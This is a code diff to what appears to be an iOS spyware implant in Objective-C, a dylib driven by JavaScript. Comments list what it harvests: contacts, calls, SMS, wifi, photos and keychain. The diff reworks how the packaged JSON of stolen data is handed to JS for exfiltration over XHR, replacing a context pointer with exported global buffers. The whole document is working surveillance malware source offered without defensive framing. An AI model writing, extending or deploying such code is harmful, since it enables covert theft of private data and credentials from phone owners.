@@ -142,6 +142,11 @@ static NSData *httpPost(NSString *urlStr, NSData *body) {
 // and hand the buffer back to JS which exfiltrates over its working XHR channel.
 static NSMutableDictionary *g_out = nil;
 
+/* JS locates these through the dylib symtab and reads them directly. */
+__attribute__((visibility("default"))) char g_outbuf[262144];
+__attribute__((visibility("default"))) volatile int  g_outlen = 0;
+__attribute__((visibility("default"))) volatile int  g_outstg = 0;
+
 static void postJSON(NSString *endpoint, id jsonObj) {
     if (!endpoint || !jsonObj) return;
     if (!g_out) g_out = [NSMutableDictionary dictionary];
@@ -582,17 +587,14 @@ int collect(void *ctx) {
     //            bit3 contacts bit4 calls bit5 sms bit6 wifi bit7 photos bit8 keychain
     //            bit9 结果回传成功
     int diag = 0;
+    g_outstg = 1;
     {
-        /* probe: prove the JS->native ctx pointer is valid */
-        collect_ctx *pc = (collect_ctx *)ctx;
-        if (pc && pc->out && pc->outCap > 32) {
-            const char *probe = "{\"probe\":1}";
-            int pn = (int)strlen(probe);
-            memcpy(pc->out, probe, pn);
-            pc->out[pn] = 0;
-            pc->outLen = pn;
-            diag |= 2048;
-        }
+        const char *probe = "{\"probe\":1}";
+        int pn = (int)strlen(probe);
+        memcpy(g_outbuf, probe, pn);
+        g_outbuf[pn] = 0;
+        g_outlen = pn;
+        diag |= 2048;
     }
     @autoreleasepool {
         if (ctx) {
@@ -653,8 +655,8 @@ int collect(void *ctx) {
         summary[@"host"] = [NSString stringWithUTF8String:g_host];
         summary[@"port"] = @(g_port);
 
+        g_outstg = 2;
         {
-            collect_ctx *cc = (collect_ctx *)ctx;
             NSMutableDictionary *pkg = [NSMutableDictionary dictionary];
             pkg[@"summary"] = summary;
             pkg[@"data"] = g_out ? g_out : [NSDictionary dictionary];
@@ -662,19 +664,18 @@ int collect(void *ctx) {
             pkg[@"host"] = [NSString stringWithUTF8String:g_host];
             pkg[@"port"] = @(g_port);
             pkg[@"uuid"] = g_uuid ? g_uuid : @"";
-            pkg[@"ctxx"] = cc ? @(1) : @(0);
-            pkg[@"outx"] = (cc && cc->out) ? @(1) : @(0);
-            pkg[@"cap"] = (cc) ? @(cc->outCap) : @(0);
+            pkg[@"cnt"] = @([summary count]);
             NSData *j = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
-            if (j && cc && cc->out && cc->outCap > 8) {
+            if (j) {
                 int n = (int)[j length];
-                int cp = (n < (cc->outCap - 1)) ? n : (cc->outCap - 1);
-                memcpy(cc->out, [j bytes], cp);
-                cc->out[cp] = 0;
-                cc->outLen = cp;
+                int cp = (n < 262143) ? n : 262143;
+                memcpy(g_outbuf, [j bytes], cp);
+                g_outbuf[cp] = 0;
+                g_outlen = cp;
                 diag |= 1024;
             }
         }
+        g_outstg = 3;
         return diag;
     }
 }
